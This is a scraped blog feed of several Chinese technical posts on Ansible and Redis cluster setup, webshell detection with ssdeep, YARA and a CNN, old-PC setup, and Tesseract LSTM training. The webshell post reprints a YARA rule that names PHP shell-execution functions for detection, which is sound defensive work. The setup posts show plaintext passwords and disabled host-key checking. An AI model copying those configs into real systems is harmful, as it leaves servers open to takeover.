ssh-keygen -F &#123;&#123; inventory_hostname &#125;&#125;</span><br><span class="line">      register: keygen</span><br><span class="line">      failed_when: keygen.stderr != &apos;&apos;</span><br><span class="line">      changed_when: False</span><br><span class="line"></span><br><span class="line">    - name: fetch remote ssh key</span><br><span class="line">      command: ssh-keyscan -T5 &#123;&#123; inventory_hostname &#125;&#125;</span><br><span class="line">      register: keyscan</span><br><span class="line">      failed_when: keyscan.rc != 0 or keyscan.stdout == &apos;&apos;</span><br><span class="line">      changed_when: False</span><br><span class="line">      when: keygen.rc == 1</span><br><span class="line"></span><br><span class="line">    - name: add ssh-key to local known_hosts</span><br><span class="line">      lineinfile:</span><br><span class="line">        name: ~/.ssh/known_hosts</span><br><span class="line">        create: yes</span><br><span class="line">        line: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class="line">      when: keygen.rc == 1</span><br><span class="line">      with_items: &apos;&#123;&#123; keyscan.stdout_lines|default([]) &#125;&#125;&apos;</span><br></pre></td></tr></table></figure><p>你可以看到，头是这样写的<code>#!/usr/bin/env ansible-playbook</code>，这意味着，上面一段可以保存着<code>shell</code>脚本，然后执行即可。当然你也可以保存成纯粹的文本文件，然后用<code>ansible-playbook</code>去执行。</p><p>执行过之后本机会添加所有指纹，主机配置在<code>/etc/ansible/hosts</code>,接着就可以执行相应的控制了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@master:~<span class="comment"># ansible -i /etc/ansible/hosts slave -m ping --ask-pass -u ansible</span></span><br><span class="line">SSH password: </span><br><span class="line">45.76.222.2xx | SUCCESS =&gt; &#123;</span><br><span class="line">    <span class="string">"changed"</span>: <span class="literal">false</span>, </span><br><span class="line">    <span class="string">"ping"</span>: <span class="string">"pong"</span></span><br><span class="line">&#125;</span><br><span class="line">45.76.197.1xx | SUCCESS =&gt; &#123;</span><br><span class="line">    <span class="string">"changed"</span>: <span class="literal">false</span>, </span><br><span class="line">    <span class="string">"ping"</span>: <span class="string">"pong"</span></span><br><span class="line">&#125;</span><br><span class="line">root@master:~<span class="comment"># ansible -i /etc/ansible/hosts slave -m shell -a 'date' --ask-pass -u ansible</span></span><br><span class="line">SSH password: </span><br><span class="line">45.76.197.1xx | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">Fri Aug 11 07:12:43 UTC 2017</span><br><span class="line"></span><br><span class="line">45.76.222.2xx | SUCCESS | rc=0 &gt;&gt;</span><br><span class="line">Fri Aug 11 07:12:43 UTC 2017</span><br></pre></td></tr></table></figure><p>如果你在host里面写了用户名密码配置，就不再需要在命令行输入,配置文件里面这么写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">host_key_checking=false</span><br><span class="line"></span><br><span class="line">[all:vars]</span><br><span class="line">ansible_connection=ssh</span><br><span class="line">ansible_ssh_user=ansible</span><br><span class="line">ansible_ssh_pass=test</span><br><span class="line"></span><br><span class="line">#hosts</span><br><span class="line">[slave]</span><br><span class="line">45.76.197.1xx</span><br><span class="line">45.76.222.2xx</span><br></pre></td></tr></table></figure><p>至于通过<code>ansible</code>命令行执行，可以参考附属链接。网上的一些<code>ansible</code>教程都忽略了一些东西。自己实践的时候就知道了。</p><p><code>ansible -i inventory/production web -m shell -a &#39;date&#39; --ask-pass -uuser</code></p><h4 id="后记-其他"><a href="#后记-其他" class="headerlink" title="后记 : 其他"></a>后记 : 其他</h4><p>以我说对找房子没有要求，其实是要求的，要求一个正常的环境。干干净净，安安静静。室内空气正常，不是甲醛超标到刺鼻，声音吵到带耳塞睡觉。厕所和厨房脏到自己打理，然后还是会变脏。仅此而已。这是有多么正常的事情。原来那些看起来很正常的事情背后有着这么多的努力。技术分享会也一样。<br>以前说对找工作没有要求，其实还是有要求的，希望有所成长。哎，很多事情变得不可预料了。</p><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources:"></a>Resources:</h4><ul><li><a href="https://blog.goquxiao.com/posts/2015/09/01/ansible-simple-tutorial/" target="_blank" rel="noopener">Ansible Simple Tutorial</a></li><li><a href="https://imlonghao.com/10.html" target="_blank" rel="noopener">pyspider集群部署</a></li></ul><p>原文扯淡如下:</p><blockquote><p>如果要搭建mongo集群也差不多，注意下写法就行了。例如mongo中的<code>bind = [127.0.0.1, 10.99.0.11]</code></p></blockquote><p>We use three machices, Two of them was be setting as slave. </p><h3 id="Step-1-Install-Redis-In-Ubuntu-16-04"><a href="#Step-1-Install-Redis-In-Ubuntu-16-04" class="headerlink" title="Step 1: Install Redis In Ubuntu 16.04"></a>Step 1: Install Redis In Ubuntu 16.04</h3><p>It can be easily  install by <code>apt-get</code>, And In vultr , You can setting it into StartupScripts, Just add this line</p><pre><code>#!bin/bashapt install -y redis-server</code></pre><p>Just directly deploy 3 instance , when server  was running , also redis-server was running. If you don’t know how to edit startup scripts,  you can just login into your instace , type <code>apt install -y redis-serve</code> , when installed was finished,<br>You would get  a redis server  instance.</p><p>Note:</p><ul><li>For Security , You need enable the private network ,and shouldn’t expose it to public network.</li></ul><h3 id="Step-2-Configure-your-private-network"><a href="#Step-2-Configure-your-private-network" class="headerlink" title="Step 2 :  Configure your private network"></a>Step 2 :  Configure your private network</h3><p>When enable private network and deploy the instance, You would find the private network address from Instance  settings in the control  panel .But  private network  was not working before your configure. So we need edit the network interface, in ubuntu, you can do something like this:<br>       <code>vim /etc/network/interface</code></p><p>Then add this line, In this example, my private network  address is <code>10.99.0.11</code>, you need chang it to your private  ip address . And same to another instance.</p><pre><code>auto ens7iface ens7 inet static       address 10.99.0.11       netmask 255.255.0.0       mtu 1450</code></pre><p>After change the <code>/etc/network/interface</code> , we need  restart the network services.<br><code>ifup ens7</code></p><p>Note :</p><ul><li>Use <code>service  ssh start</code>, and You can use ssh and private network address to connect  your slave machine.</li></ul><h3 id="Step3-Configure-Redis-Cluster"><a href="#Step3-Configure-Redis-Cluster" class="headerlink" title="Step3 :  Configure  Redis Cluster"></a>Step3 :  Configure  Redis Cluster</h3><p>After step 1 and step2 , we already have a private network and three redis server, Now we need to connect it as a distributed  cluster.<br>Now , we begin to configure our redis server.  conf file was placed in <code>/etc/redis/redis.conf</code>,  First,  we need change the  <code>redis bind</code>, So, You need  change them use the private network address  as their binds.   You need bind it in each<br>instance <code>bind 10.99.0.10</code> or <code>bind 10.99.0.11</code> or  <code>bind 10.99.0.12</code>.  In this example , <code>10.99.0.10</code> was be consider as master , <code>10.99.0.11</code> and <code>10.99.0.12</code> was setting as slave . Next step was important tell the slave redis the master  redis  address and port. So , we need edit the conf file:</p><ul><li><p>In 10.99.0.11 /etc/redis/redis.conf :</p><pre><code>slaveof 10.99.0.10 6379</code></pre></li><li><p>In 10.99.0.12 /etc/redis/redis.conf:</p><pre><code>slaveof 10.99.0.10 6379</code></pre></li></ul><p>Barring accidents, when you finished this type, the redis server was configure finished . And  you  can get a simple redis cluster. When you restart  your service ,<code>service redis-server restart</code>, It would be working  correctly .</p><p>And  In the slave machine , Use <code>redis-cli -h 10.99.0.10 -p 6379</code>， You would connect the master redis,  To get<br> more  info , just type <code>INFO</code>, And redis would tell you something more.</p><p>Note :</p><ul><li>For Security, You need edit redis conf and enable  password authorization.  <code>requirepass yourpass</code> , Therefore  you need edit slave conf with <code>masterauth &lt;master-password&gt;</code></li></ul><blockquote><ul><li>In 10.99.0.10 /etc/redis/redis.conf :<pre><code>`requirepass wohaha`</code></pre></li><li>In 10.99.0.11 /etc/redis/redis.conf : <pre><code>`masterauth wohaha`</code></pre></li><li>In 10.99.0.12 /etc/redis/redis.conf:<pre><code>`masterauth wohaha`</code></pre></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言-就是废话啦&quot;&gt;&lt;a href=&quot;#前言-就是废话啦&quot; class=&quot;headerlink&quot; title=&quot;前言 : 就是废话啦&quot;&gt;&lt;/a&gt;前言 : 就是废话啦&lt;/h4&gt;&lt;p&gt;之前为了给vultr写一篇文档&lt;code&gt;how to build a redis 
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="学习笔记" scheme="http://iami.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>新开始:webshell的检测</title>
    <link href="http://iami.xyz/2017/07/22/New-Begin-For-Nothing/"/>
    <id>http://iami.xyz/2017/07/22/New-Begin-For-Nothing/</id>
    <published>2017-07-21T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言-新的开始"><a href="#前言-新的开始" class="headerlink" title="前言 : 新的开始"></a>前言 : 新的开始</h4><p>6.25号开始新的工作，生活慢慢回到主旋律。Not bad,Not Good. 公司给配置了一台新的电脑，从抹上CPU的硅脂，到装上每一颗螺丝，再到<br>刻盘和点亮操作系统。我想像着像一台新的机器一样，开始全速运转。填充自己。</p><h4 id="正文-如何开始"><a href="#正文-如何开始" class="headerlink" title="正文 : 如何开始"></a>正文 : 如何开始</h4><p>目前要做的软件包含一个模块，叫做webshell的检测。webshell的话就不用介绍了，日站的东西我的博客好像也从来没有介绍过。不跑题了。<br>webshell就暂且理解成恶意代码吧。实质上也就是恶意代码的检测。<br>针对不同的目标，出现了以下类别为代表的检测方法。</p><ul><li>基于日志的检测方法</li><li>基于流量的检测方法</li><li>基于行为的检测方法</li></ul><p>其实，我到网上看了看，真正有的并不多。一些少之又少的博客也只是大谈方法论和架构。而无论从方法还是架构上，都没有看到有较好的实现。当然，针对asp,jsp,php的可检测做的还是有一些做的蛮不错的。而从方法上划分上，我热为可以分为以下几种(记住，方法可以用在不同的目标上，流量监测可以用到这些方法，日志也可以用到这些方法。当然，理论上是看自己的设计了)</p><ol><li>基于文件相似度的(模糊hash计算)</li><li>基于代码特征值(yara规则匹配)</li><li>基于机器学习的方法(准确说是统计学的机器学习，不少人用朴素贝叶斯和SVM做恶意代码的分类，SVM作为工业级的算法产品，自然毋庸置疑，但是出于考虑到样本问题，还可能出现一些其他问题，例如特征选取，分词提取上的问题。)</li></ol><h5 id="正文二-如何检测"><a href="#正文二-如何检测" class="headerlink" title="正文二 : 如何检测"></a>正文二 : 如何检测</h5><p>下面就三种方法做一个简单</p><ul><li>基于文件相似度,采用<code>ssdeep</code></li></ul><p>基于文件相似度，实际即是考虑到<a href="http://blog.csdn.net/cwqbuptcwqbupt/article/details/7591818" target="_blank" rel="noopener">模糊hash算法</a></p><blockquote><p>一个弱哈希算法，以及一个分片值，用于分片。一个强哈希算法，用于计算每片的哈希。一个压缩映射算法，将每片的哈希值映射为一个更短的值<br>一个比较算法，用于对两个模糊哈希值计算相似程度</p></blockquote><p>简单的讲，就是分片求哈希，然后连接重新计算哈希值。给出的链接里已经比较详细的介绍了该算法的问题。具体可以参考。下面介绍下<code>ssdeep</code>的使用。想使用ssdeep检验文件的相似性，必须首先把已有文件的特征值导出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ find ./php -<span class="built_in">type</span> f -<span class="built_in">exec</span> ssdeep -t 80 -bm php.ssdeep &#123;&#125; \; </span><br><span class="line">$ ssdeep -bsm  php.ssdeep  -r ./php -t 80 -c</span><br><span class="line"><span class="comment">#这两种写法是一致的，都是对一个文件夹内的所有文件进行校验。</span></span><br><span class="line"></span><br><span class="line">$ ssdeep -r *  </span><br><span class="line"><span class="comment"># 或者直接ssdeep * 即可将该文件夹下的所有特征值输出，如需保存，记得重定向到文件。</span></span><br></pre></td></tr></table></figure><p>常用的就是这几个选项，其他的用法比较简单。</p><ul><li>基于代码特征值，采用<code>yara</code></li></ul><p>代码特征，主要是指恶意代码和正常代码由于目的性不同，可以通过文件内的代码类型来进行判断。例如，正常的php代码内是不会有大块的base64加密，也不会有大量的<code>eval</code>和<code>prg_replace</code>。因此，可以通过采用对已知危险的关键字进行匹配，语句进行匹配。从而来检测webshell，但是由于规则的通用性层面来讲，必然会出现不小的误报情况。Yara是谷歌开源的一款模式匹配引擎，可以对文本内容进行匹配，从而进行检测。当然，不止可以对于文本内容，还可以对二进制文件进行模式匹配，甚至还可以匹配内存中的某段值，来以此进行检验。是目前很屌的一款开源引擎。命令行使用的话，最简单的可以是 <code>yara -r ./xxx/rule/xxx.yar /target/directory</code>下面我们可以通过一段简单的针对php的yara规则进行分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">rule DangerousPhp</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $system = &quot;system&quot; fullword nocase  // localroot bruteforcers have a lot of this</span><br><span class="line"></span><br><span class="line">        $ = &quot;array_filter&quot; fullword nocase</span><br><span class="line">        $ = &quot;assert&quot; fullword nocase</span><br><span class="line">        $ = &quot;backticks&quot; fullword nocase</span><br><span class="line">        $ = &quot;call_user_func&quot; fullword nocase</span><br><span class="line">        $ = &quot;eval&quot; fullword nocase</span><br><span class="line">        $ = &quot;exec&quot; fullword nocase</span><br><span class="line">        $ = &quot;fpassthru&quot; fullword nocase</span><br><span class="line">        $ = &quot;fsockopen&quot; fullword nocase</span><br><span class="line">        $ = &quot;function_exists&quot; fullword nocase</span><br><span class="line">        $ = &quot;getmygid&quot; fullword nocase</span><br><span class="line">        $ = &quot;shmop_open&quot; fullword nocase</span><br><span class="line">        $ = &quot;mb_ereg_replace_callback&quot; fullword nocase</span><br><span class="line">        $ = &quot;passthru&quot; fullword nocase</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的规则(摘自<a href="https://github.com/nbs-system/php-malware-finder/blob/master/php-malware-finder/php.yar" target="_blank" rel="noopener">php-malware-finder</a>)中可以看出，是对<code>eval</code>,<code>exec</code>,<code>assert</code>等关键词进行无大小命中，即可判断为危险PHP文件，同样，这种方法会导致误判率较高，因此需要采用白名单过滤的方法。通过对文件的md5或者sha1进行校验，存在白名单中，即可进行一定的过滤。例如，wordpress,joomla，discuz等等。规则的编写方式要<a href="http://yara.readthedocs.io/en/v3.6.0/writingrules.html" target="_blank" rel="noopener">参考文档</a>，类C写法，还是比较简单易懂的。同时，我们可以利用已经公开的webshell的yara特征数据库进行检测，去提高正确率。yara还是需要详细的学习的。</p><ul><li>基于机器学习的方法</li></ul><p>当然，到最后。必不可少的要讲下机器学习的方法。目前主流是基于统计学的机器学习方法。此处，退一步讲，在文本分类上，采用朴素贝叶斯的较多，SVM也不乏有人在做。朴素贝叶斯是基于贝叶斯定理，计算先验概率和后验概率的。假设在事件A发生的情况下，事件B发生的概率。当然，算法理解后，工程实现一点也不难，因为有现成的库可以使用。但是此处，我们并没有采用朴素贝叶斯的方法。而是采用了一个<a href="https://github.com/dennybritz/cnn-text-classification-tf" target="_blank" rel="noopener">基于CNN的文本二分类模型</a>。具体的网络设计可以查看论文。该模型是将已标记的文本按行输入，预处理之后读入第一层网络，网络的大小是以该行最长单词长度作为宽度，以单词个数作为长度，将其映射为一个二维向量，然后再进行单行的特征提取，然后对每一行进行选取特征。这个其实是基于word2vec实现的。最开始的时候，我也是打算采用word2vec，进行处理。在学习了TF-IDF和n-gram之后，也是突发奇想搜索了一下有没有基于文本直接进行分类的。恰好发现了这个项目，感谢作者。中间其实还有一些问题，比如文本文件无法读取等。不过还好，最后采用这个输出了一个比较好的结果。但是由于这个二维向量作为一个大的输入，如果你的文本稍长一些，就会导致非常之吃内存。然后崩掉。我是拿到服务器上，把样本读进去之后大概用了40G的内存。在本机时候是崩溃掉了。</p><p>相对来讲ssdeep，yara来讲，这个是精确度最高的，并且针对ssdeep无法检测的小文件，也可以用其进行正确的判断。</p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>这三种方法可以被应用到不同的检测目标上去，采用基于流量拦截的话，就去采集一批恶意请求的样本，之后是进行相似度校验，还是规则命中，或者采用机器学习。都是可以的。如果需要实时检测的话，可以通过对web服务提供一个中间件，把上传文件的请求经过该webshell检测中间件即可。可以部署成单独的微服务。从垂直方向拆分业务，并且将可维护成本降到最低。<br>总体来讲，效果还是不错。但是Yara和ssdeep对平台有一定的依赖性，所以分离到windows下使用有一定的麻烦。</p><h4 id="遇到以及需要的问题"><a href="#遇到以及需要的问题" class="headerlink" title="遇到以及需要的问题"></a>遇到以及需要的问题</h4><ul><li>ssdeep针对较小的文件不能生成有效的特征值</li><li>yara可以针对单个文件的多条规则进行命中</li><li>机器学习过程中样本较少</li><li>白名单和规则应该由专人维护</li><li>是否可以通过GAN网络，自动学习到并生成攻击性代码？</li></ul><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><ul><li><a href="https://github.com/nbs-system/php-malware-finder" target="_blank" rel="noopener">php malware finder</a></li><li><a href="https://github.com/VirusTotal/yara" target="_blank" rel="noopener">yara</a></li><li><a href="https://github.com/Neo23x0/yarGen" target="_blank" rel="noopener">yarGen rule</a></li><li><a href="https://github.com/emposha/Shell-Detector" target="_blank" rel="noopener">Shell-Detector</a></li><li><a href="https://github.com/dennybritz/cnn-text-classification-tf" target="_blank" rel="noopener">CNN Text Classification</a></li><li><a href="https://arxiv.org/abs/1408.5882v2" target="_blank" rel="noopener">CNN Text Classification论文</a></li><li><a href="http://ssdeep.sourceforge.net/" target="_blank" rel="noopener">ssdeep</a></li><li><a href="http://blog.csdn.net/cwqbuptcwqbupt/article/details/7591818" target="_blank" rel="noopener">模糊hash算法</a></li><li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">webshell</a></li><li><a href="https://github.com/ysrc/webshell-sample" target="_blank" rel="noopener">webshell-sample</a></li><li><a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank" rel="noopener">fuzzdb</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言-新的开始&quot;&gt;&lt;a href=&quot;#前言-新的开始&quot; class=&quot;headerlink&quot; title=&quot;前言 : 新的开始&quot;&gt;&lt;/a&gt;前言 : 新的开始&lt;/h4&gt;&lt;p&gt;6.25号开始新的工作，生活慢慢回到主旋律。Not bad,Not Good. 公司给配置了
      
    
    </summary>
    
      <category term="HowTo 学习数据挖掘的路上" scheme="http://iami.xyz/categories/HowTo-%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E7%9A%84%E8%B7%AF%E4%B8%8A/"/>
    
    
      <category term="学习笔记" scheme="http://iami.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="机器学习" scheme="http://iami.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>纯属折腾之——旧电脑折腾日记</title>
    <link href="http://iami.xyz/2017/06/18/Review-S09-Simple-For-Mom/"/>
    <id>http://iami.xyz/2017/06/18/Review-S09-Simple-For-Mom/</id>
    <published>2017-06-17T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言-旧电脑退休了"><a href="#前言-旧电脑退休了" class="headerlink" title="前言 : 旧电脑退休了"></a>前言 : 旧电脑退休了</h4><p>这两天租房子这小区维修水管，早上6点就突突突打电钻，突突的睡不着。真是折腾。<br>毕业了，旧电脑也退休了，收拾收拾放家里。嗯，就这样。</p><h4 id="正文-如何开始"><a href="#正文-如何开始" class="headerlink" title="正文 : 如何开始"></a>正文 : 如何开始</h4><p>目标:</p><ol><li>字体大，容易操作,尽量不要有广告</li><li>能看电视剧，听音乐，用用微信</li><li>安全，不要被劫持，不要被钓鱼</li></ol><p>具体:<br>系统采用win10，删除不必要软件，优化系统性能。调整显示，安装常用软件，影音安全，禁止命令行，运行指定程序。</p><ul><li>拆了1T硬盘，换个500G的上去，把1T的拿来做移动硬盘</li><li>装了个Win10系统，安装驱动精灵，安装完驱动卸载驱动精灵。</li><li>桌面采用大图标</li><li>Microsoft Edge缩放150</li><li>删除系统输入法，只保留了搜狗输入法，老年版皮肤字体够大。而且可以语音输入</li><li>屏蔽广告： PC屏蔽，和浏览器屏蔽。 Opera的内置了广告防护，电脑管家也带了广告防护</li><li>装了个腾讯视频，微信，7zip</li><li>装了个Lanuncy，本来还打算装个Everything，后来出于考虑不装了</li><li>删除不必要的系统自带软件</li><li>启动项优化</li><li>组策略禁用安装程序，只允许运行指定程序，就是你刚刚安装的</li><li>禁用了自动更新</li><li>关闭家庭组</li></ul><h4 id="其他-两个问题"><a href="#其他-两个问题" class="headerlink" title="其他: 两个问题"></a>其他: 两个问题</h4><ul><li>如何用批处理或powershell控制组策略？</li><li>怎么更适宜中老年人用？</li></ul><h4 id="windows软件列表"><a href="#windows软件列表" class="headerlink" title="windows软件列表:"></a>windows软件列表:</h4><p>虽然自己整天玩linux，但是在windows下也折腾过一段时间，多取前人经验。</p><ul><li>Lanuncy</li><li>Everything</li><li>IDM </li><li>EagleGet</li><li>7Zip</li><li>VLC / KMPlayer</li><li>网易云 / Foobar</li><li>FastCaputreStone</li><li>Sublime Text3 / Notepad++</li><li>f.lux</li><li>Avast</li><li>CCleaner</li><li>Opera / Chrome</li><li>IObit Unistaller</li><li>TeamViewer</li><li>XShell</li><li>Git</li><li>Sumatra PDF</li></ul><blockquote><p>折腾好旧电脑，来记录下吧。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言-旧电脑退休了&quot;&gt;&lt;a href=&quot;#前言-旧电脑退休了&quot; class=&quot;headerlink&quot; title=&quot;前言 : 旧电脑退休了&quot;&gt;&lt;/a&gt;前言 : 旧电脑退休了&lt;/h4&gt;&lt;p&gt;这两天租房子这小区维修水管，早上6点就突突突打电钻，突突的睡不着。真是折腾。
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="小手段" scheme="http://iami.xyz/tags/%E5%B0%8F%E6%89%8B%E6%AE%B5/"/>
    
  </entry>
  
  <entry>
    <title>OCR和用Tesseract训练chi_sim.traineddata</title>
    <link href="http://iami.xyz/2017/06/16/Review-S05-Tesseract-lstm-traning-datafile/"/>
    <id>http://iami.xyz/2017/06/16/Review-S05-Tesseract-lstm-traning-datafile/</id>
    <published>2017-06-15T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言-Tesseract"><a href="#前言-Tesseract" class="headerlink" title="前言:Tesseract"></a>前言:Tesseract</h4><p>Tesseract 最新的版本4.0版本，新增了lstm训练方式。当时做毕设时经过一系列的其他挫折，刚好发现这个可以使用在嵌入式开发板上，因此去学习并使用了一下。</p><h4 id="正文-一-OCR简介"><a href="#正文-一-OCR简介" class="headerlink" title="正文 一: OCR简介"></a>正文 一: OCR简介</h4><p>主要有两种方法</p><ol><li><p>Segment-Based method</p><blockquote><ul><li>Template Matching for OCR</li><li>Over-Segmentation</li></ul></blockquote></li><li><p>Segmentation-Free OCR</p><blockquote><ul><li>Based On HMM</li><li>Sequence Learning Approach</li></ul></blockquote></li></ol><p>具体参考 <a href="https://kluedo.ub.uni-kl.de/files/4353/PhD_Thesis_Ul-Hasan.pdf" target="_blank" rel="noopener">这篇论文</a>，我也是读了之后，才觉得更加清晰了。<br>总的来讲就是两种方法，传统基于图像分割的方式进行文本识别，基本是采用模板匹配的方式。通过解压图片训练出一些特征后经过一个分类器使其和已知的进行比较，计算之间的相似度，有多大概率。但是分割有时不容易控制间隔，会导致图像过分割，从而使识别出来的字符变形。例如，m和n还有d,在过分割的情况下就会导致d识别为c和l。详细的例子可以参考上面那篇论文论文。而基于自由分割的OCR识别则不关心输入的长度，虽然他依旧使用分割后的图片作为输入。然后得到输出作为识别后的结果。这种方式通常使用隐马尔科夫模型和循环卷积神经网络。标准的模式识别中通常采用近邻算法，决策树，贝叶斯分类作为训练方法。在后面几章里在浅显讲讲对这些基础算法的学习情况。</p><font color="red">下面所有操作，假设你已经安装好了最新版本的Tesseract，并且<code>clone</code>了相应的<code>langdata</code>和<code>tessdata</code>，并且放置在同一目录下。</font><br>使用百度云下载详情参考<code>http://iami.xyz/Review-S06-Baiduyun-download-Taolu/</code><br><br>#### 正文 二: Tesseract的普通训练方式<br>想去ProcessON上下载原图的时候，才发现自己忘了账号是什么了…虽然当时只是作为临时存毕设的流程图用，但也是大意了。<br><img src="/images//Tesseract/common_01.png" alt="default_flow"><br><br>这就是默认的训练的流程，具体的也已经在流程图绘制的比较详细了。同样下图是每一步对应的操作。相关代码我已经放在了<code>gist</code>上，可以自行查看，包括生成图片和普通的训练链接为<code>https://gist.github.com/mylamour/e4f116e64d690c366715f67fefc8357f</code><br><br><img src="/images//Tesseract/common_02.png" alt="default_flow_code"><br><br><br><font color="red"> 注意事项 </font><ul><li>最后合并时要和之前训练好的文件放置在同一文件夹 </li><li>自己由字体生成训练图片去训练的话，图片像素不宜过大。否则训练的时候，耗时不仅久，而且会占大量内存。</li><li>普通训练只占用单核，所以非常慢。</li></ul><h4 id="正文-三-tesseract的LSTM训练方式"><a href="#正文-三-tesseract的LSTM训练方式" class="headerlink" title="正文 三: tesseract的LSTM训练方式"></a>正文 三: tesseract的LSTM训练方式</h4><p><img src="/images//Tesseract/default_lstm.png" alt="default_lstm"></p><p>这张图是按照官网给出的vgslspecs的语法，并结合官方文档介绍，自己推测画出来的。可能有错误，需要大牛指正。下面这张图展示了LSTM的cell的变化，LSTM是RNN的一种，更详细的需要参考后面的附录。我只能做个简单的介绍放在上面，数学功底有限，不宜妄言。只有理解了之后，才能重新设计一个新的网络去使用。</p><ul><li>LSTM的训练方式也有两种，一种是从头开始，自己设计一个网络。一种是从现有的字库种提取出lstm模型，然后进行修改，重新训练，合并出新的字体。此处我们选用第二种。之所以没有选用第一种，是因为从scratch训练需要运行scrollView.jar包，而这个包运行时必须需要物理显示器，也就是<code>0</code>位置的，像vnc之类的都是<code>0:1</code>或者<code>0:2</code>之类的，是不可以的。而我的服务器不仅没有物理显示器，而且我的真个环境是在自己的<code>docker</code>里面运行的。出于一系列问题，只能选第二种。</li></ul><p><img src="/images//Tesseract/lstm_01.gif" alt="lstm"></p><p>下面介绍如何进行训练。首先你需要生成一个训练集和一个测试集，下面的部分截图来自我论文里。</p><ul><li><p>step 1: 生成训练集和测试集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tesstrain.sh --fonts_dir /usr/share/fonts/ch_2000/ --lang chi_sim --linedata_only   --noextract_font_properties --langdata_dir /home/langdata   --tessdata_dir ./tessdata --output_dir /home/lstmtest/400type/chitrain</span><br><span class="line">$ tesstrain.sh --fonts_dir /usr/share/fonts/ch_2000/ --lang chi_sim --linedata_only   --noextract_font_properties --langdata_dir /home/langdata   --tessdata_dir ./tessdata --font-list <span class="string">"STXinwei"</span> --output_dir /home/lstmtest/400type/chitrain</span><br><span class="line"><span class="comment">#从这里就可以很明细的看出，如果不指定特定的字体的话，就会直接生成整个字体文件下的所有字体。</span></span><br></pre></td></tr></table></figure></li><li><p>step 2: 从已有的字库数据里提取模型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ combine_tessdata -e \</span><br><span class="line">/usr/<span class="built_in">local</span>/share/tessdata/chi_sim.traineddata \</span><br><span class="line">./chi_sim.lstm</span><br></pre></td></tr></table></figure></li><li><p>step 3: 从已有模型开始训练</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ lstmtraining -U ./chitrain/chi_sim.unicharset \</span><br><span class="line">  --script_dir ../langdata --debug_interval 0 \</span><br><span class="line">  --continue_from ./tranlayer/chi_sim.lstm \</span><br><span class="line">  --append_index 5 --net_spec <span class="string">'[Lfx256 O1c105]'</span> \</span><br><span class="line">  --model_output ./ \</span><br><span class="line">  --train_listfile ./chitrain/chi_sim.training_files.txt\</span><br><span class="line">  --max_iterations 500000</span><br><span class="line"><span 